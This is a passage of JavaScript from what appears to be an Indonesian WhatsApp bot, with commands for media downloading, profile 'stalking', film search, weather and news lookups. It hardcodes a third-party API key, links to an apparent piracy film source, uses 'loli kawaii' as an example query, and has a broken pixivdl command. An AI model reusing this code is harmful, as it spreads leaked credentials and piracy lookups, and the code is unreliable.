				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			    reply(mess.wait)
			    try{
				ini_url = args[0]
		    	anu =  await fetchJson(`http://api.lolhuman.xyz/api/tiktok?apikey=${LolApi}&url=${ini_url}`)
				tiktok = `*「 TIKTOK DOWNLOADER 」*\n\n*Username :* ${anu.result.author.username}\n*Nickname :* ${anu.result.author.nickname}\n*Title :* ${anu.result.title}\n*Keywords :* ${anu.result.keywords}\n*Description :* ${anu.result.description}\n*Share:* ${anu.result.statistic.shareCount}\n*Comment:* ${anu.result.statistic.commentCount}\n*Play:* ${anu.result.statistic.playCount}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				buffert = await getBuffer(anu.result.thumbnail)
				client.sendMessage(from, buffert, image, {quoted: mek, caption: tiktok})
				ini_buffer = await getBuffer(anu.result.link)
				client.sendMessage(from, ini_buffer, video, { quoted: mek})
				await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply('Error ngab, Sepertinya videonya tidak bisa di download')
			    } 
			   break
	case 'tiktokaudio':
		        if (!isRegistered) return reply(mess.only.userB)
	         	if (isBanned) return reply(mess.only.benned)
	         	if (isLimit(sender)) return reply(mess.limituser)
				if (!q) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
				reply(mess.wait)
				hx.ttdownloader(`${args[0]}`)
				.then(async(result) => {
				ttmusic = await getBuffer(result.audio)
				client.sendMessage(from, ttmusic, audio, { quoted: mek})
				})
				.catch(e => console.log(e))
				await limitAdd(sender) 
				break
	case 'tiktokaudio2':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)		
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			    ini_link = args[0]
			    get_audio = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${LolApi}&url=${ini_link}`)
			    client.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
			    await limitAdd(sender) 
			    break
	case 'tiktok':			
	case 'tiktokwm':
			    if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
    		    if (args.length < 1) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
				reply(mess.wait)
				hx.ttdownloader(`${args[0]}`)
				.then(async(result) => {
				ttvid = await getBuffer(result.wm)
				client.sendMessage(from, ttvid, video, { quoted: mek})
				})
				.catch(e => console.log(e))
				await limitAdd(sender) 
			    break
	case 'tiktokstalk2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
			    try {
			    if (args.length < 1) return client.sendMessage(from, 'Usernamenya mana gan?', text, {quoted: mek})
			    let { user, stats } = await tiktod.getUserProfileInfo(args[0])
			    reply(mess.wait)
			    teks = `*ID* : ${user.id}\n*Username* : ${user.uniqueId}\n*Nickname* : ${user.nickname}\n*Followers* : ${stats.followerCount}\n*Followings* : ${stats.followingCount}\n*Posts* : ${stats.videoCount}\n*Menyukai* : ${stats.heart}\n`
			    buffer = await getBuffer(user.avatarLarger)
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
			    } catch (e) {
			    console.log(`Error :`, color(e,'red'))
			    reply('Kemungkinan username tidak valid')
			    }
			    await limitAdd(sender) 
			    break    
		   case 'tiktokstalk':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('Usernamenya mana gan?')
				query = args[0]
				reply(mess.wait)
				try {
		        anu = await fetchJson(`https://api.vhtear.com/tiktokprofile?query=${query}&apikey=${VthearApi}`)
			    teks = `*Username* : ${anu.result.username}
*Verified* : ${anu.result.verified}
*Following* : ${anu.result.follow}
*Followers* : ${anu.result.follower}
*Like Count* : ${anu.result.like_count}
*Video Post* : ${anu.result.video_post}
*Bio* : ${anu.result.bio}
*Title* : ${anu.result.title}
*Link* : ${anu.result.url_account}`
			    buffer = await getBuffer(anu.result.picture)
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
			    } catch (e) {
			    console.log(`Error :`, color(e,'red'))
			    reply('Kemungkinan username tidak valid')
			    }
			    await limitAdd(sender) 
			    break  
	   case 'film':
	    	if (!isRegistered) return reply(mess.only.userB)
	    	if (isBanned) return reply(mess.only.benned)
	     	if (isLimit(sender)) return reply(mess.limituser)
		    if (args.length < 1) return reply('Mau Cari Film Apa?')
		    reply(mess.wait)
		    anu = await fetchJson(`http://www.omdbapi.com/?s=${body.slice(6)}&plot=full&apikey=56b1b6f0&r=json`, {method: 'get'})
		    hasil = '=========================\n'
		    for(let film of anu.Search) {
		    hasil += `• *Title:* ${film.Title}\n• *Rilis Tahun:* ${film.Year}\n• *Type:* ${film.Type}\n• *Link:* https://m.imdb.com/title/${film.imdbID}\n=========================\n`
		    }
		    reply(hasil.trim())
		    await limitAdd(sender) 
			   break 
		case 'lk21':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
			    query = args.join(" ")
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lk21?apikey=${LolApi}&query=${query}`)
			    get_result = get_result.result
			    ini_txt = `Title : ${get_result.title}\n`
			    ini_txt += `Link : ${get_result.link}\n`
			    ini_txt += `Genre : ${get_result.genre}\n`
			    ini_txt += `Views : ${get_result.views}\n`
			    ini_txt += `Duration : ${get_result.duration}\n`
			    ini_txt += `Tahun : ${get_result.tahun}\n`
			    ini_txt += `Rating : ${get_result.rating}\n`
			    ini_txt += `Desc : ${get_result.desc}\n`
			    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
	 		    ini_txt += `Location : ${get_result.location}\n`
			    ini_txt += `Date Release : ${get_result.date_release}\n`
			    ini_txt += `Language : ${get_result.language}\n`
			    ini_txt += `Link Download : ${get_result.link_dl}`
			    thumbnail = await getBuffer(get_result.thumbnail)
			    client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
			    await limitAdd(sender) 
			    break
	    case 'drakorongoing':
			    if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=${LolApi}`)
			    get_result = get_result.result
			    ini_txt = "Ongoing Drakor\n\n"
			    for (var x of get_result) {
				   ini_txt += `Title : ${x.title}\n`
				   ini_txt += `Link : ${x.link}\n`
				   ini_txt += `Thumbnail : ${x.thumbnail}\n`
				   ini_txt += `Year : ${x.category}\n`
				   ini_txt += `Total Episode : ${x.total_episode}\n`
				   ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
	case 'googleimage':
	case 'gimage':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply(`Example: ${prefix + command} Yogyakarta`)
			    gimg = args.join(" ");
				reply(mess.wait)
				gis(gimg, async (error, result) => {
				n = result
				images = n[Math.floor(Math.random() * n.length)].url
				anu = await getBuffer(images)
				client.sendMessage(from, anu, image,{quoted: mek})
				})
				break
	case 'gimage2':
    case 'googleimage2':
		        if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
			    query = args.join(" ")
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gimage2?apikey=${LolApi}&query=${query}`)
			    get_result = get_result.result
			    for (var x = 0; x <= 5; x++) {
				var ini_buffer = await getBuffer(get_result[x])
				client.sendMessage(from, ini_buffer, image)
			    }
			    await limitAdd(sender) 
			    break
	case 'googleimage3':
	case 'gimage3':
		        if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
			    query = args.join(" ")
			    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${LolApi}&query=${query}`)
			    client.sendMessage(from, ini_buffer, image, { quoted: mek })
			    await limitAdd(sender) 
			    break
		 case 'coganasli':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=cowo+ganteng`)
				ini_url = ini_url.result
				ini_buffer = await getBuffer(ini_url)
				await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: `Nih cogannya ${pushname}`})
				await limitAdd(sender)
				break
		case 'cecanasli':
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
				    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=cewek+cantik`)
					ini_url = ini_url.result
			   	    ini_buffer = await getBuffer(ini_url)
				    await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: `Nih cecannya ${pushname}`})
					await limitAdd(sender)
					break
	case 'pinterest':
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	         	if (isLimit(sender)) return reply(mess.limituser)
	         	if(!q) return reply(`Example: ${prefix + command} Yogyakarta`)
	         	reply(mess.wait)
	        	let pin = await hx.pinterest(q)
	         	let ac = pin[Math.floor(Math.random() * pin.length)]
	        	let di = await getBuffer(ac)
	        	await client.sendMessage(from,di,image,{ quoted: mek, caption: `*PINTEREST:* ${q}`})
		        limitAdd(sender)
				break
	case 'pinterest2':
		    	if (!isRegistered) return reply(mess.only.userB)
		     	if (isBanned) return reply(mess.only.benned)
		     	if (isLimit(sender)) return reply(mess.limituser)
		     	if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
			    query = args.join(" ")
				reply(mess.wait)
			    let pinn = await hx.pinterest(query)
	        	for (var x = 0; x <= 5; x++) {
					var dip = await getBuffer(pinn[x])
				await client.sendMessage(from,dip,image,{ quoted: mek})
				}
			   break
		   case 'pinterestdl':
		     	if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length == 0) return reply(`Example: ${prefix + command} https://id.pinterest.com/pin/267893877823775677/`)
			    reply(mess.wait)
			    anu = await fetchJson(`https://api.vhtear.com/pinterestdl?link=${args[0]}&apikey=${VthearApi}`)
			    ini_buffer = await getBuffer(anu.result.fileUrl)
			    client.sendMessage(from, ini_buffer, video, { quoted: mek})
			    await limitAdd(sender) 
			    break
		   case 'pixiv':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
			   query = args.join(" ")
			   ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/pixiv?apikey=${LolApi}&query=${query}`)
			   await client.sendMessage(from, ini_buffer, image, { quoted: mek })
			   await limitAdd(sender) 
			   break
		   case 'pixivdl':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} 63456028`)
			   query = args[0]
			   ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/pixivdl/${pixivid}?apikey=${LolApi}`)
			   await client.sendMessage(from, ini_buffer, image, { quoted: mek })
			   await limitAdd(sender) 
			   break
			case 'wallpapersearch2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
			   query = args.join(" ")
			   ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/wallpaper?apikey=${LolApi}&query=${query}`)
			   client.sendMessage(from, ini_buffer, image, { quoted: mek })
			   await limitAdd(sender) 
			   break
		   case 'wallpapersearch':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			if (!isPremium) return reply(mess.only.premium)
			   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
			   query = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${LolApi}&query=${query}`)
			   ini_buffer = await getBuffer(get_result.result)
			   client.sendMessage(from, ini_buffer, image, { quoted: mek })
			   await limitAdd(sender) 
			   break
		case 'igstory': 
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
		        if (!isPremium) return reply(mess.only.premium)
			    if (!q) return reply('Usernamenya?')
				if (q.includes('https://www.instagram.com/stories/')) return reply('Username aja mas')
				if (q.includes('https://instagram.com/stories/')) return reply('Username aja mas')
				reply (mess.wait)
			    hx.igstory(q)
			    .then(async result => {
			    for(let i of result.medias){
			    if(i.url.includes('mp4')){
				let link = await getBuffer(i.url)
				client.sendMessage(from,link,video,{quoted: mek })
				} else {
				let link = await getBuffer(i.url)
			    client.sendMessage(from,link,image,{quoted: mek })                  
				}
			    }
			    });
			    break
		case 'igstory2':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
		   //	reply('Maaf ig story sedang dalam perbaikan tim kami.')
		    	if (!isPremium) return reply(mess.only.premium)
		        if (args.length < 1) return reply('username??')
		        reply (mess.wait)
		        try{
		        instor = `${body.slice(9)}`
				if (instor.includes('https://www.instagram.com/stories/')) return reply('Username aja mas')
				if (instor.includes('https://instagram.com/stories/')) return reply('Username aja mas')
		        get_result = await fetchJson(`http://api.lolhuman.xyz/api/igstory/${instor}?apikey=${LolApi}`)
		        ini_result = get_result.result
		        for (var x of ini_result) {
		    	ini_type = image
		    	if (x.includes(".mp4")) ini_type = video
		    	ini_buffer = await getBuffer(x)
		    	client.sendMessage(from, ini_buffer, ini_type, { quoted: mek })
		        }
		        } catch (e) {
		    	console.log(`Error :`, color(e,'red'))
		    	reply(mess.error.bug)
                }
		        break
		case 'ighighlight': 
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
		        if (!isPremium) return reply(mess.only.premium)
			    if (!q) return reply('Usernamenya?')
				if (q.includes(`https://www.instagram.com/stories/`)) return reply('Username aja mas')
				reply (mess.wait)
			    hx.ighighlight(q)
			    .then(async result => {
			    for(let i of result.medias){
			    if(i.url.includes('mp4')){
				let link = await getBuffer(i.url)
				client.sendMessage(from,link,video,{quoted: mek })
				} else {
				let link = await getBuffer(i.url)
			    client.sendMessage(from,link,image,{quoted: mek })                  
				}
			    }
			    });
			    break
		case 'igstalk3':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} username`)
				hx.igstalk(q)
				.then(async(result) => {
				teks = `*Username :* ${args.join('')}
*Full Name :* ${result.fullName}
*Bio :* ${result.biography}
*Private :* ${result.isPrivate}
*Verified :* ${result.isVerified}
*Followers :* ${result.followers}
*Following :* ${result.following}
*Post Count :* ${result.postsCount}
*Is Recent User :* ${result.isRecentUser}
*Highlight Count :* ${result.highlightCount}
*Bussines Account :* ${result.isBusinessAccount}
*Link :* https://instagram.com/${args.join('')}`
                slebeww = await getBuffer(result.profilePicHD)
				client.sendMessage(from, slebeww, image, {quoted: mek, caption: teks})
				})      
				break
		case 'igstalk2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} username`)
				ig.fetchUser(`${args.join(" ")}`).then(Y => {
				ten = `${Y.profile_pic_url_hd}`
				teks = `*Username :* ${args.join('')}
*Full Name :* ${Y.full_name}
*Bio :* ${Y.biography}
*Followers :* ${Y.followers}
*Following :* ${Y.following}
*Private :* ${Y.is_private}
*Verified :* ${Y.is_verified}
*Link :* https://instagram.com/${args.join('')}`
				sendMediaURL(from,ten,teks) 
				})      
				break  
		case 'igstalk':
			    if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} username`)
				username = args[0]
				ini_result = await fetchJson(`https://api.vhtear.com/igprofile?query=${username}&apikey=${VthearApi}`)
		    	ini_result = ini_result.result
				ini_buffer = await getBuffer(ini_result.picture)
				ini_txt = `*Username :* ${ini_result.username}\n`
				ini_txt += `*Full Name :* ${ini_result.full_name}\n`
				ini_txt += `*Post :* ${ini_result.post_count}\n`
				ini_txt += `*Followers :* ${ini_result.follower}\n`
				ini_txt += `*Following :* ${ini_result.follow}\n`
				ini_txt += `*Private Account :* ${ini_result.is_private}\n`
				ini_txt += `*Bio :* ${ini_result.biography}`
				client.sendMessage(from, ini_buffer, image, { caption: ini_txt }) 
				await limitAdd(sender) 
				break 
	   case 'igstalk4':
		        if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} username`)
			    username = args[0]
			    ini_result = await fetchJson(`http://api.lolhuman.xyz/api/stalkig/${username}?apikey=${LolApi}`)
			    ini_result = ini_result.result
			    ini_buffer = await getBuffer(ini_result.photo_profile)
			    ini_txt = `*Username :* ${ini_result.username}\n`
			    ini_txt += `*Full Name :* ${ini_result.fullname}\n`
			    ini_txt += `*Post :* ${ini_result.posts}\n`
			    ini_txt += `*Followers :* ${ini_result.followers}\n`
			    ini_txt += `*Following :* ${ini_result.following}\n`
			    ini_txt += `*Bio :* ${ini_result.bio}`
			    client.sendMessage(from, ini_buffer, image, { caption: ini_txt }) 
			    await limitAdd(sender) 
			    break   
		   case 'githubstalk':
			    if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} LoL-Human`)
			    username = args[0]
			    ini_result = await fetchJson(`http://api.lolhuman.xyz/api/github/${username}?apikey=${LolApi}`)
			    ini_result = ini_result.result
			    ini_buffer = await getBuffer(ini_result.avatar)
			    ini_txt = `Name : ${ini_result.name}\n`
			    ini_txt += `Link : ${ini_result.url}\n`
			    ini_txt += `Public Repo : ${ini_result.public_repos}\n`
			    ini_txt += `Public Gists : ${ini_result.public_gists}\n`
			    ini_txt += `Followers : ${ini_result.followers}\n`
			    ini_txt += `Following : ${ini_result.following}\n`
			    ini_txt += `Bio : ${ini_result.bio}`
			    client.sendMessage(from, ini_buffer, image, { caption: ini_txt })
			   break
		   case 'twitterstalk':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} jokowi`)
			    username = args[0]
			    ini_result = await fetchJson(`https://api.vhtear.com/twittprofile?username=${username}&apikey=${VthearApi}`)
			    ini_result = ini_result.result
			    ini_buffer = await getBuffer(ini_result.profile_image)
			    ini_txt = `*Name :* ${ini_result.name}\n`
			    ini_txt += `*Username :* ${ini_result.username}\n`
			    ini_txt += `*Tweet Count :* ${ini_result.status_count}\n`
			    ini_txt += `*Media Count :* ${ini_result.media_count}\n`
			    ini_txt += `*Favorite Count :* ${ini_result.favourites_count}\n`
			    ini_txt += `*Id :* ${ini_result.id_str}\n`
			    ini_txt += `*Rest Id :* ${ini_result.rest_id_str}\n`
			    ini_txt += `*Followers :* ${ini_result.followers_count}\n`
			    ini_txt += `*Following :* ${ini_result.folowed_count}\n`
			    ini_txt += `*Location :* ${ini_result.location}\n`
			    ini_txt += `*Description :* ${ini_result.description}`
			    client.sendMessage(from, ini_buffer, image, { caption: ini_txt })
			    break
		case 'twitterstalk2':
			    if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} jokowi`)
			    username = args[0]
			    ini_result = await fetchJson(`http://api.lolhuman.xyz/api/twitter/${username}?apikey=${LolApi}`)
			    ini_result = ini_result.result
			    ini_buffer = await getBuffer(ini_result.profile_picture)
			    ini_txt = `Username : ${ini_result.screen_name}\n`
			    ini_txt += `Name : ${ini_result.name}\n`
			    ini_txt += `Tweet : ${ini_result.tweet}\n`
			    ini_txt += `Joined : ${ini_result.joined}\n`
			    ini_txt += `Followers : ${ini_result.followers}\n`
			    ini_txt += `Following : ${ini_result.following}\n`
			    ini_txt += `Like : ${ini_result.like}\n`
			    ini_txt += `Description : ${ini_result.description}`
			    client.sendMessage(from, ini_buffer, image, { caption: ini_txt })
			    break
        case 'cuaca':
        case 'infocuaca':
            	if (!isRegistered) return reply(mess.only.userB)
	            if (isBanned) return reply(mess.only.benned)
            	if (isLimit(sender)) return reply(mess.limituser)
                if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
			    daerah = args[0]
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${LolApi}`)
			    get_result = get_result.result
			    ini_txt = `Tempat : ${get_result.tempat}\n`
			    ini_txt += `Cuaca : ${get_result.cuaca}\n`
			    ini_txt += `Angin : ${get_result.angin}\n`
			    ini_txt += `Description : ${get_result.description}\n`
			    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
			    ini_txt += `Suhu : ${get_result.suhu}\n`
			    ini_txt += `Udara : ${get_result.udara}\n`
			    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
			    client.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: mek })
			    reply(ini_txt)
			    await limitAdd(sender)
			    break 
	case 'covidindo':
		        if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/indonesia?apikey=${LolApi}`)
			    get_result = get_result.result
			    ini_txt = `Positif : ${get_result.positif}\n`
			    ini_txt += `Sembuh : ${get_result.sembuh}\n`
			    ini_txt += `Dirawat : ${get_result.dirawat}\n`
			    ini_txt += `Meninggal : ${get_result.meninggal}`
			    reply(ini_txt)
			    await limitAdd(sender) 
			    break
	case 'covidglobal':
			    if (!isRegistered) return reply(mess.only.userB)
			    if (isBanned) return reply(mess.only.benned)
		    	if (isLimit(sender)) return reply(mess.limituser)
			    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/global?apikey=${LolApi}`)
			    get_result = get_result.result
			    ini_txt = `Positif : ${get_result.positif}\n`
			    ini_txt += `Sembuh : ${get_result.sembuh}\n`
			    ini_txt += `Dirawat : ${get_result.dirawat}\n`
			    ini_txt += `Meninggal : ${get_result.meninggal}`
			    reply(ini_txt)
			    await limitAdd(sender) 
			    break
		   case 'kodepos':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			if (!isPremium) return reply(mess.only.premium)
			   if (args.length == 0) return reply(`Example: ${prefix + command} Sleman or ${prefix + command} 66154`)
			   daerah = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/kodepos?apikey=${LolApi}&query=${daerah}`)
			   get_result = get_result.result[0]
			   ini_txt = `Provinsi : ${get_result.province}\n`
			   ini_txt += `Kabupaten : ${get_result.city}\n`
			   ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
			   ini_txt += `Kelurahan : ${get_result.urban}\n`
			   ini_txt += `Kode Pos : ${get_result.postalcode}`
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		   case 'jadwalbola':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwalbola?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = "Jadwal Bola :\n"
			   for (var x of get_result) {
				   ini_txt += `Hari : ${x.hari}\n`
				   ini_txt += `Jam : ${x.jam}\n`
				   ini_txt += `Event : ${x.event}\n`
				   ini_txt += `Match : ${x.match}\n`
				   ini_txt += `TV : ${x.tv}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		   case 'indbeasiswa':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/indbeasiswa?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = 'Info Beasiswa :\n'
			   for (var x of get_result) {
				   ini_txt += `Title : ${x.title}\n`
				   ini_txt += `Link : ${x.link}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		   case 'hoax':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/turnbackhoax?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = 'Info Hoax :\n'
			   for (var x of get_result) {
				   ini_txt += `Title : ${x.title}\n`
				   ini_txt += `Link : ${x.link}\n`
				   ini_txt += `Posted : ${x.posted}\n`
				   ini_txt += `Description : ${x.desc}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
	case 'wattpad':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (!isPremium) return reply(mess.only.premium)
			   if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
			   ini_url = args[0]
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpad?apikey=${LolApi}&url=${ini_url}`)
			   get_result = get_result.result
			   ini_txt = `Title : ${get_result.title}\n`
			   ini_txt += `Rating : ${get_result.rating}\n`
			   ini_txt += `Motify date : ${get_result.modifyDate}\n`
			   ini_txt += `Create date: ${get_result.createDate}\n`
			   ini_txt += `Word : ${get_result.word}\n`
			   ini_txt += `Comment : ${get_result.comment}\n`
			   ini_txt += `Vote : ${get_result.vote}\n`
			   ini_txt += `Reader : ${get_result.reader}\n`
			   ini_txt += `Pages : ${get_result.pages}\n`
			   ini_txt += `Description : ${get_result.desc}\n\n`
			   ini_txt += `Story : \n${get_result.story}`
			   thumbnail = await getBuffer(get_result.photo)
			   client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
			   await limitAdd(sender) 
			   break
		   case 'wattpadsearch':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
			   query = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpadsearch?apikey=${LolApi}&query=${query}`)
			   get_result = get_result.result
			   ini_txt = "Wattpad Seach : \n"
			   for (var x of get_result) {
				   ini_txt += `Title : ${x.title}\n`
				   ini_txt += `Url : ${x.url}\n`
				   ini_txt += `Part : ${x.parts}\n`
				   ini_txt += `Motify date : ${x.modifyDate}\n`
				   ini_txt += `Create date: ${x.createDate}\n`
				   ini_txt += `Coment count: ${x.commentCount}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
			case 'groupwa':
			case 'grupwa':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				   if (args.length == 0) return reply(`Example: ${prefix + command} IXB GROUP`)
				   query = args.join(" ")
				   get_result = await fetchJson(`https://api.lolhuman.xyz/api/groupwhatsapp2?apikey=${LolApi}&query=${query}`)
				   get_result = get_result.result
				   ini_txt = `*Hasil Pencarian Group Whatsapp :* ${query}\n\n`
				   for (var x of get_result) {
					   ini_txt += `═════════════════\n*Title :* ${x.title}\n`
					   ini_txt += `*Link :* ${x.link}\n`
				   }
				   ini_txt +=`═════════════════`
				   ini_txt +=`\n*NOTE : OWNER TIDAK BERTANGGUNG JAWAB ATAS APA YANG ANDA LAKUKAN PADA GRUP YG ANDA JOIN.*\n`
				   reply(ini_txt)
				   await limitAdd(sender) 
				   break
		   case 'jadwaltv':
